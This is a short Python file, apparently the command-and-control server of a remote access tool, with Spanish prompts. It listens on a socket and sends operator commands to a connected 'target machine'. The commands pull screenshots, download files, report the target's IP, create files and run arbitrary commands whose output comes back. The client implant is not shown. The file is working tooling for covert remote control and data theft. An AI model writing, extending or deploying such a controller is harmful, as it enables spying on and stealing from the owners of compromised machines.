# server.py
import socket

HOST = 'You_Ip'
PORT = 12345

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f"Servidor escuchando en {HOST}:{PORT}")

    conn, addr = s.accept()
    with conn:
        print(f"Conexión desde {addr}")
        while True:
            comando = input("Ingresa un comando: ")
            conn.sendall(comando.encode('utf-8'))
            if comando.lower() == 'exit':
                break
            elif comando.lower() == 'screenshot':
                with open('screenshot_recibida.png', 'wb') as f:
                    f.write(conn.recv(4096))
                print("Captura de pantalla recibida.")
            elif comando.startswith('cd '):
                print(conn.recv(1024).decode('utf-8'))
            elif comando.startswith('download '):
                with open('archivo_recibido', 'wb') as f:
                    f.write(conn.recv(4096))
                print("Archivo recibido.")
            elif comando.lower() == 'getip':
                ip = conn.recv(1024).decode('utf-8')
                print(f'IP de la máquina objetivo: {ip}')
            elif comando.startswith('createfile '):
                respuesta = conn.recv(1024).decode('utf-8')
                print(respuesta)
            else:
                resultado = conn.recv(4096).decode('utf-8')
                print(resultado)